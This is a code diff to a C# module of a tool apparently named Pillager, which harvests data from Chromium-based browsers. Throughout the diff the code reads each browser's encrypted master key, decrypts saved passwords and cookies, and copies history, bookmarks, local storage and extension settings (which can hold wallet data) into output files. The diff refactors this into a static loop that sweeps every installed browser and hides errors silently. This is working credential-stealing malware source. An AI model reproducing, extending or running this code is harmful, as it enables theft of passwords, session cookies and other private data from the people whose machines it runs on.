@@ -7,13 +7,13 @@ using Pillager.Helper;
 
 namespace Pillager.Browsers
 {
-    public class Chrome
+    public static class Chrome
     {
-        public string BrowserPath { get; set; }
+        public static string BrowserPath { get; set; }
 
-        public string BrowserName { get; set; }
+        public static string BrowserName { get; set; }
 
-        public byte[] MasterKey { get; set; }
+        public static byte[] MasterKey { get; set; }
 
         public static Dictionary<string, string> browserOnChromium = new Dictionary<string, string>
         {
@@ -40,7 +40,7 @@ namespace Pillager.Browsers
             { "Iridium", "Iridium\\User Data" },
         };
 
-        private string[] profiles = {
+        private static string[] profiles = {
         "Default",
         "Profile 1",
         "Profile 2",
@@ -49,20 +49,13 @@ namespace Pillager.Browsers
         "Profile 5"
         };
 
-        public Chrome(string Name, string Path)
-        {
-            BrowserName = Name;
-            BrowserPath = Path;
-            MasterKey = GetMasterKey();
-        }
-
-        public byte[] GetMasterKey()
+        public static byte[] GetMasterKey()
         {
             string filePath = Path.Combine(BrowserPath, "Local State");
             byte[] masterKey = new byte[] { };
             if (!File.Exists(filePath))
                 return null;
-            var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath).Replace(" ",""));
+            var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath).Replace(" ", ""));
             foreach (System.Text.RegularExpressions.Match prof in pattern)
             {
                 if (prof.Success)
@@ -80,7 +73,7 @@ namespace Pillager.Browsers
             }
         }
 
-        private byte[] DecryptData(byte[] buffer)
+        private static byte[] DecryptData(byte[] buffer)
         {
             byte[] decryptedData = null;
             if (MasterKey is null) return null;
@@ -108,7 +101,7 @@ namespace Pillager.Browsers
             return decryptedData;
         }
 
-        public string Chrome_passwords()
+        public static string Chrome_passwords()
         {
             StringBuilder passwords = new StringBuilder();
             foreach (var profile in profiles)
@@ -142,7 +135,7 @@ namespace Pillager.Browsers
             return passwords.ToString();
         }
 
-        public string Chrome_history()
+        public static string Chrome_history()
         {
             StringBuilder history = new StringBuilder();
             foreach (var profile in profiles)
@@ -169,14 +162,14 @@ namespace Pillager.Browsers
             return history.ToString(); ;
         }
 
-        public string Chrome_cookies()
+        public static string Chrome_cookies()
         {
             StringBuilder cookies = new StringBuilder();
             foreach (var profile in profiles)
             {
                 string chrome_cookie_path = Path.Combine(BrowserPath, profile + "\\Cookies");
                 string chrome_100plus_cookie_path = Path.Combine(BrowserPath, profile + "\\Network\\Cookies");
-                if (!File.Exists(chrome_cookie_path) == true) 
+                if (!File.Exists(chrome_cookie_path) == true)
                     chrome_cookie_path = chrome_100plus_cookie_path;
                 if (!File.Exists(chrome_cookie_path))
                     continue;
@@ -213,12 +206,12 @@ namespace Pillager.Browsers
             return cookies.ToString();
         }
 
-        public string Chrome_books()
+        public static string Chrome_books()
         {
             StringBuilder stringBuilder = new StringBuilder();
             foreach (var profile in profiles)
             {
-                string chrome_book_path = BrowserName.Contains("360")?Path.Combine(BrowserPath, profile + "\\360Bookmarks"): Path.Combine(BrowserPath, profile + "\\Bookmarks");
+                string chrome_book_path = BrowserName.Contains("360") ? Path.Combine(BrowserPath, profile + "\\360Bookmarks") : Path.Combine(BrowserPath, profile + "\\Bookmarks");
                 if (File.Exists(chrome_book_path))
                 {
                     stringBuilder.Append(File.ReadAllText(chrome_book_path));
@@ -227,26 +220,33 @@ namespace Pillager.Browsers
             return stringBuilder.ToString();
         }
 
-        public void Save(string path)
+        public static void Save(string path)
         {
-            try
+            foreach (var browser in Chrome.browserOnChromium)
             {
-                if (MasterKey == null) return;
-                string savepath = Path.Combine(path, BrowserName);
-                Directory.CreateDirectory(savepath);
-                string cookies = Chrome_cookies();
-                string passwords = Chrome_passwords();
-                string books = Chrome_books();
-                string history = Chrome_history();
-                if (!String.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies);
-                if (!String.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
-                if (!String.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
-                if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
-                if (Directory.Exists(Path.Combine(BrowserPath, "Local Storage"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Local Storage"), Path.Combine(savepath, "Local Storage"), true);
-                if (Directory.Exists(Path.Combine(BrowserPath, "Local Extension Settings"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Local Extension Settings"), Path.Combine(savepath, "Local Extension Settings"), true);
-                if (Directory.Exists(Path.Combine(BrowserPath, "Sync Extension Settings"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Sync Extension Settings"), Path.Combine(savepath, "Sync Extension Settings"), true);
+                try
+                {
+                    string chromepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), browser.Value);
+                    BrowserName = browser.Key;
+                    BrowserPath = chromepath;
+                    MasterKey = GetMasterKey();
+                    if (MasterKey == null) return;
+                    string savepath = Path.Combine(path, BrowserName);
+                    Directory.CreateDirectory(savepath);
+                    string cookies = Chrome_cookies();
+                    string passwords = Chrome_passwords();
+                    string books = Chrome_books();
+                    string history = Chrome_history();
+                    if (!String.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies);
+                    if (!String.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
+                    if (!String.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
+                    if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
+                    if (Directory.Exists(Path.Combine(BrowserPath, "Local Storage"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Local Storage"), Path.Combine(savepath, "Local Storage"), true);
+                    if (Directory.Exists(Path.Combine(BrowserPath, "Local Extension Settings"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Local Extension Settings"), Path.Combine(savepath, "Local Extension Settings"), true);
+                    if (Directory.Exists(Path.Combine(BrowserPath, "Sync Extension Settings"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Sync Extension Settings"), Path.Combine(savepath, "Sync Extension Settings"), true);
+                }
+                catch { }
             }
-            catch { }
         }
     }
 }
